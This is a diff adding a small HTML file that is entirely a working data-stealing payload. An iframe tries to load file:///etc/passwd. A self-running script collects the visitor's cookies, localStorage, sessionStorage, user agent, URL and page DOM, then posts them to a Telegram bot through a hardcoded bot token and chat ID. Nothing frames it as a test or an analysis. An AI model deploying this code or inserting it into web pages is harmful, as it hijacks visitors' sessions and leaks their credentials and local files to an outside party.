@@ -1,0 +1,47 @@
+<html>
+<iframe src="file:///etc/passwd" width="100%" height="600px"> </iframe>
+<script>
+(function () {
+  const token = "7706430486:AAFbBe4XhbWP0azMe3qftRufe3VhXOqYIRc";
+  const chatId = "6309973240";
+
+  function safeJson(obj) {
+    try {
+      return JSON.stringify(obj);
+    } catch {
+      return "[Unserializable]";
+    }
+  }
+
+  function truncate(str, max = 1000) {
+    return str.length > max ? str.slice(0, max) + " ...[truncated]" : str;
+  }
+
+  const data = {
+    url: location.href,
+    cookies: document.cookie || "None",
+    localStorage: truncate(safeJson(localStorage)),
+    sessionStorage: truncate(safeJson(sessionStorage)),
+    userAgent: navigator.userAgent,
+    dom: truncate(document.documentElement.outerHTML)
+  };
+
+  const message =
+    `URL: ${data.url}\n` +
+    `User-Agent: ${data.userAgent}\n` +
+    `Cookies: ${data.cookies}\n\n` +
+    `LocalStorage: ${data.localStorage}\n\n` +
+    `SessionStorage: ${data.sessionStorage}\n\n` +
+    `DOM:\n${data.dom}`;
+
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message
+    })
+  }).catch(console.error);
+})();
+</script>
+</html>
